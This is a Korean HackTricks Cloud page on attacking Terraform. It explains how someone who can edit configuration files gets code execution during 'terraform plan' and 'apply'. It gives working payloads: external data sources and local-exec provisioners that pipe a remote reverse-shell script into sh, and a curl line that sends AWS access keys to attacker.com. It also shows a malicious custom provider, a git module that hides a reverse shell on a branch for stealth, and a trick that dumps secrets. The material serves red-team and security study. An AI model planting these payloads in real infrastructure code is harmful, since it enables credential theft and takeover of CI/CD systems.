# Terraform 보안

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## 기본 정보

[문서에서 참조: ](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform은 **인프라를 코드로 정의**할 수 있는 도구로, 인간이 읽을 수 있는 구성 파일에서 **클라우드 및 온프레미스 리소스**를 정의하고 버전 관리, 재사용 및 공유할 수 있습니다. 그런 다음 일관된 워크플로우를 사용하여 인프라의 전체 수명 주기 동안 인프라를 프로비저닝하고 관리할 수 있습니다. Terraform은 컴퓨팅, 스토리지, 네트워킹 리소스와 같은 저수준 구성 요소뿐만 아니라 DNS 항목 및 SaaS 기능과 같은 고수준 구성 요소도 관리할 수 있습니다.

### Terraform은 어떻게 작동합니까?

Terraform은 클라우드 플랫폼 및 기타 서비스에 대한 리소스를 생성하고 관리하기 위해 해당 응용 프로그래밍 인터페이스(API)를 통해 리소스를 생성하고 관리합니다. 제공자는 Terraform이 액세스 가능한 API를 통해 거의 모든 플랫폼이나 서비스와 작동할 수 있도록 합니다.

![](<../.gitbook/assets/image (33).png>)

HashiCorp와 Terraform 커뮤니티는 이미 **1700개 이상의 제공자**를 작성하여 수천 가지 다른 유형의 리소스와 서비스를 관리하고 있으며, 이 숫자는 계속해서 증가하고 있습니다. Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog 등을 포함한 모든 공개적으로 사용 가능한 제공자를 [Terraform 레지스트리](https://registry.terraform.io/)에서 찾을 수 있습니다.

Terraform의 핵심 워크플로우는 세 가지 단계로 구성됩니다:

* **작성:** 여러 클라우드 제공자와 서비스에 걸쳐 리소스를 정의합니다. 예를 들어, 가상 사설 클라우드(VPC) 네트워크에서 가상 머신에 응용 프로그램을 배포하는 구성을 생성할 수 있습니다. 이 구성에는 보안 그룹과 로드 밸런서가 포함됩니다.
* **계획:** Terraform은 기존 인프라 및 구성에 기반하여 생성, 업데이트 또는 삭제할 인프라를 설명하는 실행 계획을 생성합니다.
* **적용:** 승인되면 Terraform은 제안된 작업을 올바른 순서로 수행하며, 모든 리소스 종속성을 고려합니다. 예를 들어, VPC의 속성을 업데이트하고 해당 VPC의 가상 머신 수를 변경하는 경우, Terraform은 가상 머신을 확장하기 전에 VPC를 다시 생성합니다.

![](<../.gitbook/assets/image (81).png>)

## Terraform Lab

컴퓨터에 Terraform을 설치하세요.

여기 [가이드](https://learn.hashicorp.com/tutorials/terraform/install-cli)와 [Terraform을 다운로드하는 가장 좋은 방법](https://www.terraform.io/downloads)이 있습니다.

## Terraform에서의 RCE

Terraform은 **웹 페이지나 네트워크 서비스를 노출하는 플랫폼이 없기 때문에** 열거할 수 있는 방법이 없습니다. 따라서 terraform을 침해하려면 **terraform 구성 파일을 추가/수정할 수 있어야** 합니다.

그러나 terraform은 올바르게 작동하기 위해 다양한 위치에 **특권 액세스**가 있으므로 침해하기 매우 민감한 구성 요소입니다.

공격자가 terraform이 실행되는 시스템을 침해할 수 있는 주요 방법은 terraform 구성을 저장하는 **저장소를 침해**하는 것입니다. 왜냐하면 어느 시점에서는 이 구성이 **해석**될 것이기 때문입니다.

실제로, **PR이 생성된 후 자동으로 terraform plan/apply를 실행하는 솔루션**인 Atlantis와 같은 솔루션이 있습니다:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

terraform 파일을 침해할 수 있다면 `terraform plan` 또는 `terraform apply`를 실행할 때 RCE를 수행할 수 있는 다양한 방법이 있습니다.

### Terraform plan

Terraform plan은 terraform에서 **가장 많이 사용되는 명령**이며, 개발자 및 terraform을 사용하는 솔루션은 항상 이를 호출합니다. 따라서 `terraform plan`에서 임의의 명령을 실행하는 terraform 구성 파일을 조작하는 것이 **가장 쉬운 RCE 방법**입니다.

#### 외부 제공자 사용

Terraform은 [`external` 제공자](https://registry.terraform.io/providers/hashicorp/external/latest/docs)를 제공하여 Terraform과 외부 프로그램 간의 인터페이스를 제공합니다. `external` 데이터 소스를 사용하여 `plan` 중에 임의의 코드를 실행할 수 있습니다.

다음과 같이 terraform 구성 파일에 주입하면 `terraform plan`을 실행할 때 rev shell이 실행됩니다:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### 커스텀 프로바이더 사용

공격자는 [커스텀 프로바이더](https://learn.hashicorp.com/tutorials/terraform/provider-setup)를 [Terraform 레지스트리](https://registry.terraform.io/)에 전송한 다음, 기능 브랜치의 Terraform 코드에 추가할 수 있습니다 ([여기에서 예시 확인](https://alex.kaskaso.li/post/terraform-plan-rce)).
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
`init`에서 공급자가 다운로드되며, `plan`이 실행될 때 악성 코드가 실행됩니다.

[https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)에서 예제를 찾을 수 있습니다.

#### 외부 참조 사용

언급된 두 가지 옵션 모두 유용하지만, 매우 은밀하지는 않습니다 (두 번째 옵션이 첫 번째 옵션보다 더 은밀하지만 더 복잡합니다). 이 제안을 따라 **더 은밀한 방법**으로 이 공격을 수행할 수 있습니다:

* 테라폼 파일에 직접 rev 쉘을 추가하는 대신, rev 쉘을 포함하는 **외부 리소스를 로드**할 수 있습니다:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
[https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)에서 rev shell 코드를 찾을 수 있습니다.

* 외부 리소스에서는 **ref** 기능을 사용하여 **repo 내의 브랜치에 terraform rev shell 코드를 숨길 수 있습니다**. 예를 들어 다음과 같이 사용할 수 있습니다: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply는 모든 변경 사항을 적용하기 위해 실행됩니다. 또한 **local-exec**를 사용하여 **악성 Terraform 파일을 삽입하여 RCE를 얻을 수도 있습니다**.\
다음과 같은 페이로드가 `main.tf` 파일에 포함되도록만 확인하면 됩니다:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
이전 기법의 제안을 따르고 외부 참조를 사용하여이 공격을 **더 은밀하게 수행** 할 수 있습니다.

## 시크릿 덤프

`terraform apply`를 실행하여 테라폼에서 사용되는 **시크릿 값들을 덤프** 할 수 있도록 테라폼 파일에 다음과 같이 추가합니다:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## 감사 도구

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec는 테라폼 코드의 정적 분석을 사용하여 잠재적인 잘못된 구성을 식별합니다.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan은 인프라 코드의 정적 코드 분석기입니다.

## 참고 자료

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹 배우기<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family)인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기술을 공유하세요.

</details>
